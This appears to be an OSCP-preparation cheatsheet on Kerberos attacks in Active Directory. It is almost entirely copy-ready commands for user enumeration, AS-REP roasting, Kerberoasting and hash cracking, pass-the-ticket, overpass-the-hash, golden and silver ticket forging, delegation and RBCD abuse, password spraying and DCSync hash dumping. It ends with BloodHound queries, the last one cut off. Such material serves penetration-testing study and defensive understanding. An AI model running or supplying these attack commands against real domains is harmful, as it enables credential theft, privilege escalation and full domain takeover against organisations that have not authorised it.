# Kerberos Attacks Cheatsheet

> **OSCP Preparation** - Complete workflow for Kerberos authentication attacks in Active Directory

---

## Table of Contents

1. [Kerberos Basics](#1-kerberos-basics)
2. [Enumeration](#2-enumeration)
3. [AS-REP Roasting](#3-as-rep-roasting)
4. [Kerberoasting](#4-kerberoasting)
5. [Pass-the-Ticket (PtT)](#5-pass-the-ticket-ptt)
6. [Overpass-the-Hash](#6-overpass-the-hash)
7. [Golden Ticket](#7-golden-ticket)
8. [Silver Ticket](#8-silver-ticket)
9. [Delegation Attacks](#9-delegation-attacks)
10. [Password Spraying via Kerberos](#10-password-spraying-via-kerberos)
11. [DCSync Attack](#11-dcsync-attack)
12. [Targeted Kerberoasting](#12-targeted-kerberoasting)
13. [RBCD (Resource-Based Constrained Delegation)](#13-rbcd-resource-based-constrained-delegation)
14. [krb5.conf Configuration](#14-krb5conf-configuration)
15. [Troubleshooting & Common Errors](#15-troubleshooting--common-errors)
16. [Quick Reference](#16-quick-reference)
17. [BloodHound Queries](#17-bloodhound-queries)

---

## 1. Kerberos Basics

### Kerberos Authentication Flow

```
┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│   Client    │         │      KDC     │         │   Server    │
│   (User)    │         │  (DC:88/tcp) │         │  (Service)  │
└──────┬──────┘         └──────┬───────┘         └──────┬──────┘
       │                       │                        │
       │  1. AS-REQ            │                        │
       │  (Request TGT with    │                        │
       │   encrypted timestamp)│                        │
       │──────────────────────>│                        │
       │                       │                        │
       │  2. AS-REP            │                        │
       │  (TGT + Session Key)  │                        │
       │<──────────────────────│                        │
       │                       │                        │
       │  3. TGS-REQ           │                        │
       │  (TGT + Service name) │                        │
       │──────────────────────>│                        │
       │                       │                        │
       │  4. TGS-REP           │                        │
       │  (Service Ticket)     │                        │
       │<──────────────────────│                        │
       │                       │                        │
       │  5. AP-REQ            │                        │
       │  (Service Ticket)     │                        │
       │───────────────────────────────────────────────>│
       │                       │                        │
       │  6. AP-REP (optional) │                        │
       │<───────────────────────────────────────────────│
```

### Key Concepts

| Component | Description |
|-----------|-------------|
| **KDC** | Key Distribution Center (runs on Domain Controller, port 88) |
| **AS** | Authentication Service - issues TGTs |
| **TGS** | Ticket Granting Service - issues service tickets |
| **TGT** | Ticket Granting Ticket - "master ticket" for user |
| **ST** | Service Ticket - for specific service access |
| **KRBTGT** | Service account for KDC (hash = Golden Ticket key) |

---

## 2. Enumeration

### Domain Information
```bash
# Get domain info
realm discover <DOMAIN>

# LDAP enumeration
netexec ldap <DC_IP> -d <DOMAIN> -u <USER> -p <PASS>

# Enumerate users via RPC/LDAP
impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<DC_IP>
```

### User Enumeration (No Creds)
```bash
# Kerbrute - enumerate valid users
kerbrute userenum -d <DOMAIN> --dc <DC_IP> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

# Impacket - check if user exists (error code distinction)
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# Using rpcclient
rpcclient -U '' -N <DC_IP> -c 'enumdomusers'
```

### Domain Controller Discovery
```bash
# Find DCs
nslookup -type=srv _kerberos._tcp.<DOMAIN>
dig -t SRV _kerberos._tcp.<DOMAIN>

# Nmap DC ports
nmap -p 88,389,636,3268,3269 <DC_IP>
```

---

## 3. AS-REP Roasting

### What is AS-REP Roasting?
Users with **"Do not require Kerberos preauthentication"** (UF_DONT_REQUIRE_PREAUTH) can have their AS-REP response captured and cracked offline.

### Identify Vulnerable Accounts
```bash
# Impacket - find AS-REP roastable users
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt

# With creds - enumerate all domain users
impacket-GetNPUsers <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -format hashcat -outputfile asrep_hashes.txt

# NetExec module
netexec ldap <DC_IP> -d <DOMAIN> -u <USER> -p <PASS> -M asreproasting
```

### Capture AS-REP Hashes (No Creds)
```bash
# Request AS-REP for specific user
impacket-GetNPUsers <DOMAIN>/user -no-pass -dc-ip <DC_IP>

# Batch mode - multiple users
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip <DC_IP>

# john format
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -format john -outputfile asrep_john.txt -dc-ip <DC_IP>
```

### Crack AS-REP Hashes
```bash
# hashcat (mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

# john
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_john.txt

# Show cracked
hashcat -m 18200 asrep_hashes.txt --show
john --show asrep_john.txt
```

---

## 4. Kerberoasting

### What is Kerberoasting?
Request service tickets (TGS) for SPNs (Service Principal Names) and crack them offline. Service accounts often have weak passwords!

### Enumerate SPNs
```bash
# With valid domain creds
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>

# Request tickets
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt

# NetExec module
netexec ldap <DC_IP> -d <DOMAIN> -u <USER> -p <PASS> -M kerberoasting
```

### Request Specific SPN Ticket
```bash
# Using impacket
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request-user <TARGET_SPN>

# Using getST (alternative)
impacket-getTGT <DOMAIN>/<USER>:<PASS>
export KRB5CCNAME=<USER>.ccache
impacket-getST -k -spn <SPN>/<HOST> <DOMAIN>/<USER>
```

### Crack Kerberoast Hashes
```bash
# hashcat (mode 13100 for TGS-REP)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

# john
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt

# Show cracked
hashcat -m 13100 kerberoast_hashes.txt --show
```

### Automation with Rubeus (Windows)
```bash
# Download kerberoastable SPNs with Rubeus
Rubeus.exe kerberoast /nowrap /outfile:kerberoast.txt

# Request specific SPN
Rubeus.exe kerberoast /spn:MSSQLSvc/SQL01.corp.local:1433 /nowrap

# Using alternative credentials
Rubeus.exe kerberoast /creduser:CORP\\user /credpassword:Pass123 /nowrap
```

---

## 5. Pass-the-Ticket (PtT)

### Export Tickets from Memory
```bash
# Mimikatz (on Windows)
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::list /export

# Rubeus (on Windows)
Rubeus.exe dump /nowrap
Rubeus.exe dump /service:krbtgt /nowrap

# Linux - from keytab
export KRB5CCNAME=/tmp/krb5cc_$(id -u)
```

### Convert Ticket Formats
```bash
# kirbi (Windows) to ccache (Linux)
impacket-ticketConverter <KIRBI_FILE> <CCACHE_FILE>

# ccache to kirbi
impacket-ticketConverter <CCACHE_FILE> <KIRBI_FILE>
```

### Use Ticket (Linux)
```bash
# Export ccache
export KRB5CCNAME=/path/to/ticket.ccache

# Use with impacket
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>
impacket-smbexec -k -no-pass <DOMAIN>/<USER>@<TARGET>
impacket-wmiexec -k -no-pass <DOMAIN>/<USER>@<TARGET>

# Use with netexec
netexec smb <TARGET> -k --use-kcache
netexec smb <TARGET> -k -u <USER>
```

### Inject Ticket (Windows)
```bash
# Mimikatz
mimikatz # kerberos::ptt <TICKET.kirbi>

# Rubeus
Rubeus.exe ptt /ticket:<BASE64_TICKET>
Rubeus.exe ptt /ticket:<KIRBI_FILE>
Rubeus.exe ptt /luid:<LUID> /ticket:<TICKET>

# Verify
klist
```

---

## 6. Overpass-the-Hash

### What is Overpass-the-Hash?
Use NTLM hash to request a Kerberos TGT (convert NTLM → Kerberos ticket).

### Get TGT from Hash
```bash
# Impacket
impacket-getTGT <DOMAIN>/<USER> -hashes :<NTLM_HASH>
impacket-getTGT <DOMAIN>/<USER> -hashes <LM_HASH>:<NTLM_HASH>

# Export ticket
export KRB5CCNAME=<USER>.ccache

# Use ticket
netexec smb <TARGET> -k --use-kcache
```

### Rubeus (Windows)
```bash
# Ask TGT with hash
Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /ptt

# Ask TGT with AES256 key
Rubeus.exe asktgt /user:<USER> /aes256:<AES256_KEY> /domain:<DOMAIN> /ptt

# Export for cross-platform use
Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /outfile:tgt.kirbi
```

---

## 7. Golden Ticket

### What is a Golden Ticket?
Forged TGT signed with KRBTGT hash. Valid for any user, any service, any time (10 years by default)!

### Requirements
- Domain SID
- KRBTGT account hash
- Domain name
- Domain Controller name

### Get Required Information
```bash
# Get Domain SID
impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<DC_IP> 0 | grep "Domain SID"

# Get KRBTGT hash (requires DA)
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> | grep krbtgt

# Using Mimikatz (on DC or with DA)
mimikatz # lsadump::lsa /inject /name:krbtgt

# Using DCSync
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-user krbtgt
```

### Forge Golden Ticket
```bash
# Impacket ticketer.py
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -user <USER_TO_FORGE> -id <RID> -groups <GROUP_RIDS> <USERNAME>

# Example: Forge Administrator ticket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... -domain CORP.LOCAL -user Administrator -id 500 -groups 512,513,518,519,520 golden_admin

# Export
export KRB5CCNAME=golden_admin.ccache
```

### Mimikatz (Windows)
```bash
# Forge and inject
mimikatz # kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:<RID> /groups:<GROUP_RIDS> /ptt

# Full example
mimikatz # kerberos::golden /user:Administrator /domain:CORP.LOCAL /sid:S-1-5-21-... /krbtgt:... /id:500 /groups:512,513,518,519,520 /ptt

# Save to file
mimikatz # kerberos::golden /user:Administrator /domain:CORP.LOCAL /sid:S-1-5-21-... /krbtgt:... /ticket:golden.kirbi
```

### Use Golden Ticket
```bash
# Linux
export KRB5CCNAME=golden.ccache
netexec smb <DC_IP> -k --use-kcache
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET>

# Windows (after /ptt)
\\<DC>\C$
klist
```

### Golden Ticket Renewal
```bash
# Renew ticket when about to expire
Rubeus.exe renew /ticket:<TICKET> /ptt
```

---

## 8. Silver Ticket

### What is a Silver Ticket?
Forged Service Ticket (TGS) signed with service account hash. Valid only for specific service.

### Requirements
- Service account hash (or machine account hash)
- Domain SID
- Target SPN

### Forge Silver Ticket
```bash
# Impacket ticketer.py
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SPN> -user <USER_TO_FORGE> <USERNAME>

# Example: CIFS silver ticket
impacket-ticketer -nthash <MACHINE_ACCOUNT_HASH> -domain-sid S-1-5-21-... -domain CORP.LOCAL -spn cifs/TARGET.CORP.LOCAL -user Administrator silver_cifs

# Export
export KRB5CCNAME=silver_cifs.ccache
```

### Mimikatz (Windows)
```bash
# Forge CIFS silver ticket
mimikatz # kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET> /service:CIFS /rc4:<SERVICE_HASH> /ptt

# Forge HOST silver ticket (for scheduled tasks)
mimikatz # kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET> /service:HOST /rc4:<MACHINE_HASH> /ptt

# Forge RPCSS + HOST (for WMI)
mimikatz # kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET> /service:RPCSS /rc4:<MACHINE_HASH> /ptt
mimikatz # kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET> /service:HOST /rc4:<MACHINE_HASH> /ptt
```

### Common SPNs for Silver Tickets

| Service | SPN | Usage |
|---------|-----|-------|
| CIFS | `cifs/TARGET` | File access |
| HOST | `host/TARGET` | Scheduled tasks, WMI |
| HTTP | `http/TARGET` | IIS, WinRM |
| LDAP | `ldap/TARGET` | Directory access |
| MSSQL | `MSSQLSvc/TARGET:1433` | SQL Server |
| RPCSS | `rpcss/TARGET` | WMI |

---

## 9. Delegation Attacks

### Types of Delegation

| Type | Description | Attack |
|------|-------------|--------|
| **Unconstrained** | Service can delegate to ANY service | Privilege escalation to DA |
| **Constrained** | Service can delegate to SPECIFIC services | Targeted privilege escalation |
| **Resource-Based Constrained** | Resource decides who can delegate | RBCD attacks |

### Enumerate Delegation
```bash
# Find unconstrained delegation accounts
impacket-findDelegation <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>

# BloodHound
bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -c All -dc <DC>
# Look for: ALLOWED_TO_DELEGATE, TRUSTED_TO_AUTH_FOR_DELEGATION

# NetExec module
netexec ldap <DC_IP> -d <DOMAIN> -u <USER> -p <PASS> -M delegation

# PowerView (Windows)
Get-NetComputer -Unconstrained
Get-NetUser -TrustedToAuth
Get-NetComputer -TrustedToAuth
```

### Unconstrained Delegation Exploit
```bash
# Monitor for TGTs (Rubeus)
Rubeus.exe monitor /interval:5 /nowrap

# When admin connects to compromised service, capture TGT
# Then use:
Rubeus.exe ptt /ticket:<CAPTURED_TGT>

# Or export and convert
Rubeus.exe dump /service:krbtgt /nowrap
# Convert kirbi to ccache and use from Linux
```

### Constrained Delegation Exploit
```bash
# Find users with constrained delegation
impacket-findDelegation <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>

# Get S4U2self + S4U2proxy TGS (with account that has constrained delegation)
impacket-getST -spn <TARGET_SPN> -impersonate <TARGET_USER> -dc-ip <DC_IP> <DOMAIN>/<COMPROMISED_USER>:<PASS>

# Example
impacket-getST -spn cifs/TARGET.CORP.LOCAL -impersonate Administrator -dc-ip <DC_IP> CORP.LOCAL/web_svc:Password123

# Use ticket
export KRB5CCNAME=Administrator.ccache
netexec smb TARGET.CORP.LOCAL -k --use-kcache
```

### S4U2self/S4U2proxy (Rubeus)
```bash
# Get TGT for compromised service account
Rubeus.exe asktgt /user:<COMPROMISED_SVC> /rc4:<HASH> /domain:<DOMAIN>

# S4U request (constrained delegation)
Rubeus.exe s4u /user:<COMPROMISED_SVC> /rc4:<HASH> /impersonateuser:<TARGET_USER> /msdsspn:<TARGET_SPN> /ptt

# Example
Rubeus.exe s4u /user:web_svc /rc4:... /impersonateuser:Administrator /msdsspn:cifs/TARGET.CORP.LOCAL /ptt
```

---

## 10. Password Spraying via Kerberos

### What is Kerberos Password Spraying?
Test one password against multiple users to avoid lockout. Kerberos provides different error codes for valid vs invalid users.

### Kerbrute Password Spray
```bash
# Password spray with user list
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt <PASSWORD>

# Multiple passwords (slow, careful with lockout!)
kerbrute bruteuser -d <DOMAIN> --dc <DC_IP> passwords.txt <USERNAME>

# Output to file
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt 'Password123!' -o valid_creds.txt
```

### NetExec LDAP Password Spray
```bash
# Spray one password
netexec ldap <DC_IP> -d <DOMAIN> -u users.txt -p 'Password1' --continue-on-success

# Spray multiple (risky!)
netexec ldap <DC_IP> -d <DOMAIN> -u users.txt -p passwords.txt --no-bruteforce
```

### Impacket GetTGT Spray
```bash
# Check single credential
impacket-getTGT <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>

# Bash loop for spraying
for user in $(cat users.txt); do
    impacket-getTGT <DOMAIN>/${user}:<PASSWORD> -dc-ip <DC_IP> 2>/dev/null && echo "[+] Valid: ${user}"
done
```

### Understanding Kerberos Error Codes

| Code | Meaning | Description |
|------|---------|-------------|
| `KDC_ERR_PREAUTH_FAILED` | Bad password | Valid user, wrong password |
| `KDC_ERR_CLIENT_REVOKED` | Account disabled | Smart card required or disabled |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | Invalid user | User doesn't exist |
| `KDC_ERR_WRONG_REALM` | Wrong domain | User in different domain |

> **Lockout Policy:** Check with `net accounts /domain` before spraying!

---

## 11. DCSync Attack

### What is DCSync?
Simulate Domain Controller replication to extract password hashes from AD. Requires **DS-Replication-Get-Changes** and **DS-Replication-Get-Changes-All** rights (Domain Admin by default).

### Prerequisites Check
```bash
# Check if user has DCSync rights
impacket-dacledit <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -target <DOMAIN> -principal <USER_TO_CHECK>

# Or use BloodHound (look for GetChanges/GetChangesAll)
```

### Perform DCSync
```bash
# Dump all domain hashes (requires DA)
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc

# Dump specific user
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-user <TARGET_USER>

# Dump NTDS to local file
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-ntlm -outputfile ntds_dump

# Alternative: Mimikatz (on DC or with DA rights)
mimikatz # lsadump::dcsync /domain:<DOMAIN> /all /csv
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<TARGET_USER>
```

### DCSync Output Explained
```
Administrator:500:<LM_HASH>:<NTLM_HASH>:::
krbtgt:502:<LM_HASH>:<NTLM_HASH>:::
CORP.LOCAL\user:1105:<LM_HASH>:<NTLM_HASH>:::
```

### Extract KRBTGT for Golden Ticket
```bash
# DCSync just the KRBTGT account
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-user krbtgt

# Output:
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_HASH>:::
```

### Mitigation Detection
```bash
# Look for Event ID 4662 (Sensitive attribute access)
# Look for Event ID 5136 (Directory service modification)
```

---

## 12. Targeted Kerberoasting

### What is Targeted Kerberoasting?
When you have **GenericAll** or **GenericWrite** on a user account, you can:
1. Set a fake SPN on that user
2. Kerberoast the account
3. Crack the hash
4. Remove the SPN (cleanup)

### Prerequisites Check
```bash
# Check ACLs on target user with dacledit
impacket-dacledit <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -target <TARGET_USER>

# Look for: GenericAll, GenericWrite, WriteProperty (servicePrincipalName)

# BloodHound: Find users you can set SPN on
# MATCH (u:User {name: "YOU@DOMAIN.LOCAL"})-[r:GenericAll|GenericWrite]->(t:User) RETURN t.name
```

### Attack Steps

#### Step 1: Set Fake SPN
```bash
# Using PowerView (Windows)
Set-DomainObject -Identity <TARGET_USER> -Set @{serviceprincipalname='fake/whatever'}

# Using ldapmodify (Linux)
# Create LDIF file:
cat > set_spn.ldif << 'EOF'
dn: CN=<TARGET_USER>,CN=Users,DC=corp,DC=local
changetype: modify
add: servicePrincipalName
servicePrincipalName: fake/whatever
EOF

ldapmodify -x -D "<USER>@<DOMAIN>" -w '<PASSWORD>' -f set_spn.ldif
```

#### Step 2: Kerberoast
```bash
# Request TGS for the fake SPN
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request-user <TARGET_USER> -outputfile targeted_roast.txt

# Or with Rubeus
Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap
```

#### Step 3: Crack Hash
```bash
# hashcat
hashcat -m 13100 targeted_roast.txt /usr/share/wordlists/rockyou.txt

# john
john --wordlist=/usr/share/wordlists/rockyou.txt targeted_roast.txt
```

#### Step 4: Cleanup (Remove SPN)
```bash
# PowerView
Set-DomainObject -Identity <TARGET_USER> -Clear serviceprincipalname

# ldapmodify
cat > clear_spn.ldif << 'EOF'
dn: CN=<TARGET_USER>,CN=Users,DC=corp,DC=local
changetype: modify
delete: servicePrincipalName
EOF

ldapmodify -x -D "<USER>@<DOMAIN>" -w '<PASSWORD>' -f clear_spn.ldif
```

---

## 13. RBCD (Resource-Based Constrained Delegation)

### What is RBCD?
Resource determines which services can delegate to it. Attack: Add controlled account to RBCD of target.

### Check RBCD Permissions
```bash
# PowerView (Windows)
Get-DomainComputer <TARGET> -Properties msds-allowedtoactonbehalfofotheridentity

# Impacket (check if GenericAll/GenericWrite on target)
impacket-dacledit <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -target <TARGET>
```

### RBCD Attack Flow

#### Step 1: Create Computer Account (if allowed)
```bash
# impacket-addcomputer
impacket-addcomputer <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -computer-name <FAKE_PC>$ -computer-pass <PASSWORD>

# or using netexec
netexec ldap <DC_IP> -d <DOMAIN> -u <USER> -p <PASS> -M add_computer -o COMPUTER=<NAME> PASSWORD=<PASS>
```

#### Step 2: Modify RBCD on Target
```bash
# impacket-rbcd
impacket-rbcd <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -action write -delegate-from <FAKE_PC$> -delegate-to <TARGET>

# Verify
impacket-rbcd <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -action read -delegate-to <TARGET>
```

#### Step 3: Get Service Ticket
```bash
# Get TGT for fake computer
impacket-getTGT <DOMAIN>/<FAKE_PC$>:<PASSWORD>
export KRB5CCNAME=<FAKE_PC$>.ccache

# Get S4U ticket
impacket-getST -spn <TARGET_SPN> -impersonate <TARGET_USER> -dc-ip <DC_IP> <DOMAIN>/<FAKE_PC$> -k -no-pass

# Example
impacket-getST -spn cifs/TARGET.CORP.LOCAL -impersonate Administrator -dc-ip <DC_IP> CORP.LOCAL/FAKEPC$ -k -no-pass
```

#### Step 4: Use Ticket
```bash
export KRB5CCNAME=Administrator.ccache
netexec smb <TARGET> -k --use-kcache
```

---

## 14. krb5.conf Configuration

### Basic Configuration for Linux Attacks

Create `/etc/krb5.conf` or use a custom one:

```ini
[libdefaults]
    default_realm = CORP.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false
    default_ccache_name = /tmp/krb5cc_%{uid}
    # Allow RC4 (needed for many OSCP labs and older environments)
    allow_weak_crypto = true

[realms]
    CORP.LOCAL = {
        kdc = dc01.corp.local:88
        admin_server = dc01.corp.local:464
        default_domain = corp.local
    }

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
```

### Configuration for Multiple Domains
```ini
[realms]
    CORP.LOCAL = {
        kdc = dc01.corp.local:88
        admin_server = dc01.corp.local:464
    }
    DEV.CORP.LOCAL = {
        kdc = dc-dev.dev.corp.local:88
        admin_server = dc-dev.dev.corp.local:464
    }

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
    .dev.corp.local = DEV.CORP.LOCAL
    dev.corp.local = DEV.CORP.LOCAL
```

### Using Custom krb5.conf
```bash
# Set custom config
export KRB5_CONFIG=/path/to/custom/krb5.conf

# Verify config
klist -C
```

---

## 15. Troubleshooting & Common Errors

### Clock Skew (KRB_AP_ERR_SKEW)
**Error:** `Clock skew too great`
```bash
# Sync time with DC
sudo ntpdate -s <DC_IP>
# or
sudo timedatectl set-ntp false
sudo date -s "$(curl -s --head http://<DC_IP> | grep Date: | cut -d' ' -f2-)"
```

### Preauthentication Failed (KRB5KDC_ERR_PREAUTH_FAILED)
**Error:** `Preauthentication failed`
- Wrong password
- Account uses AES but you sent RC4
- Clock skew

```bash
# Specify encryption type
impacket-getTGT <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -aesKey <AES_KEY>

# Try different etype
Rubeus.exe asktgt /user:<USER> /password:<PASS> /domain:<DOMAIN> /encryption:aes256
```

### Client Not Found (KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN)
**Error:** `Client not found in Kerberos database`
- User doesn't exist
- Wrong domain/realm specified

```bash
# Verify domain
nslookup -type=srv _kerberos._tcp.<DOMAIN>

# Check case sensitivity
# Kerberos realms are CASE-SENSITIVE!
```

### SPN Not Found (KRB5KDC_ERR_S_PRINCIPAL_UNKNOWN)
**Error:** `Server not found in Kerberos database`
- SPN doesn't exist
- Wrong SPN format

```bash
# Verify SPN exists
setspn -L <SERVICE_ACCOUNT>  # On Windows
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>  # From Linux
```

### Ticket Expired (KRB5KRB_AP_ERR_TKT_EXPIRED)
**Error:** `Ticket expired`
```bash
# Renew ticket
Rubeus.exe renew /ticket:<BASE64_TICKET> /ptt

# Or get new ticket
impacket-getTGT <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>
```

### Wrong Realm (KRB5KDC_ERR_WRONG_REALM)
**Error:** `Wrong realm`
```bash
# Verify correct realm via DNS SRV
nslookup -type=srv _kerberos._tcp.<DOMAIN>

# Use correct UPN format
<USER>@<REALM>
# Example: admin@CORP.LOCAL
```

### Generic Kerberos Errors

| Error | Cause | Solution |
|-------|-------|----------|
| `KRB5KRB_AP_ERR_BAD_INTEGRITY` | Bad password/key | Verify credentials |
| `KRB5KDC_ERR_ETYPE_NOSUPP` | Encryption not supported | Allow weak crypto in krb5.conf |
| `KRB5KRB_AP_ERR_MODIFIED` | Ticket modified/stolen | Get fresh ticket |
| `KRB5_REALM_UNKNOWN` | Realm not in config | Add to krb5.conf [realms] |

### Debug Mode
```bash
# Enable Kerberos debugging
export KRB5_TRACE=/dev/stderr

# Run command with debug
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>

# Verbose mode (impacket)
impacket-getTGT <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -debug
```

---

## 16. Quick Reference

### Ticket File Locations

| OS | Location |
|----|----------|
| Linux | `/tmp/krb5cc_<UID>` (ccache format) |
| Windows | `C:\Users\<USER>\AppData\Local\Temp\<TICKET>.kirbi` |

### Hashcat Modes

| Attack Type | Mode | Format |
|-------------|------|--------|
| AS-REP Roasting | 18200 | `$krb5asrep$23$...` |
| Kerberoasting (TGS-REP) | 13100 | `$krb5tgs$23$...` |
| Kerberoasting (AES256) | 19700 | `$krb5tgs$18$...` |

### Impacket Tools Summary

| Tool | Purpose |
|------|---------|
| `getTGT` | Request TGT (from password or hash) |
| `getST` | Request Service Ticket (S4U) |
| `GetNPUsers` | AS-REP Roasting |
| `GetUserSPNs` | Kerberoasting |
| `ticketer` | Forge Golden/Silver tickets |
| `ticketConverter` | Convert kirbi <-> ccache |
| `lookupsid` | SID enumeration |
| `findDelegation` | Find delegation settings |
| `rbcd` | Manage RBCD |
| `addcomputer` | Add computer account |
| `secretsdump` | DCSync / Extract hashes |
| `dacledit` | Check/modify ACLs |

### Environment Variables
```bash
# Set Kerberos cache
export KRB5CCNAME=/path/to/ticket.ccache

# Set Kerberos config (if needed)
export KRB5_CONFIG=/path/to/krb5.conf

# View current ticket
klist
klist -e  # with encryption type
```

### Rubeus Quick Commands
```bash
# Monitor for tickets
Rubeus.exe monitor /interval:5

# Dump tickets
Rubeus.exe dump /nowrap

# Ask TGT
Rubeus.exe asktgt /user:<USER> /password:<PASS> /domain:<DOMAIN>

# Ask TGT with hash
Rubeus.exe asktgt /user:<USER> /rc4:<HASH> /domain:<DOMAIN>

# S4U (constrained delegation)
Rubeus.exe s4u /user:<SVC> /rc4:<HASH> /impersonateuser:<TARGET> /msdsspn:<SPN>

# Renew ticket
Rubeus.exe renew /ticket:<BASE64>

# Forge Golden
Rubeus.exe golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt

# Forge Silver
Rubeus.exe silver /user:<USER> /domain:<DOMAIN> /sid:<SID> /target:<TARGET> /service:CIFS /rc4:<HASH> /ptt
```

### Common Attack Flow

```
1. Enumeration
   └─> Find users (kerbrute, lookupsid)
   └─> Find SPNs (GetUserSPNs)
   └─> Find delegation (findDelegation)

2. Credential Gathering
   ├─> AS-REP Roast (no creds needed!)
   ├─> Kerberoast (needs creds)
   └─> Dump tickets (sekurlsa::tickets)

3. Lateral Movement
   ├─> Pass-the-Ticket (reuse stolen tickets)
   ├─> Overpass-the-Hash (NTLM → Kerberos)
   └─> Delegation abuse (S4U)

4. Privilege Escalation
   ├─> Silver Ticket (service account compromise)
   └─> Golden Ticket (KRBTGT compromise = Domain Admin)

5. Persistence
   └─> Golden Ticket (10 years validity)
```

---

## 17. BloodHound Queries

### Find AS-REP Roastable Users
```cypher
// Users with DONT_REQ_PREAUTH
MATCH (u:User {dontreqpreauth: true})
RETURN u.name, u.description
```

### Find Kerberoastable Users
```cypher
// Users with SPNs
MATCH (u:User)
WHERE u.hasspn = true
RETURN u.name, u.serviceprincipalnames
```

### Find Unconstrained Delegation
```cypher
// Computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation: true})
RETURN c.name, c.operatingsystem

// Users with unconstrained delegation (TRUSTED_FOR_DELEGATION)
MATCH (u:User {unconstraineddelegation: true})
RETURN u.name
```

### Find Constrained Delegation
```cypher
// Constrained delegation (TRUSTED_TO_AUTH_FOR_DELEGATION)
MATCH (u:User)
WHERE u.allowedtodelegate IS NOT NULL
RETURN u.name, u.allowedtodelegate

// Computers with constrained delegation
MATCH (c:Computer)
WHERE c.allowedtodelegate IS NOT NULL
RETURN c.name, c.allowedtodelegate
```

### Find RBCD Targets
```cypher
// Computers with RBCD configured
MATCH (c:Computer)
WHERE c.allowedtoactonbehalfofotheridentity IS NOT NULL
RETURN c.name

// Find who can modify RBCD (GenericAll/GenericWrite on computers)
MATCH (u:User)-[:GenericAll|GenericWrite]->(c:Computer)
WHERE c.allowedtoactonbehalfofotheridentity IS NULL
RETURN u.name, c.name
```

### Find DCSync Rights
```cypher
// Users with DCSync rights (GetChanges + GetChangesAll)
MATCH (u:User)-[:GetChanges|GetChangesAll]->(d:Domain)
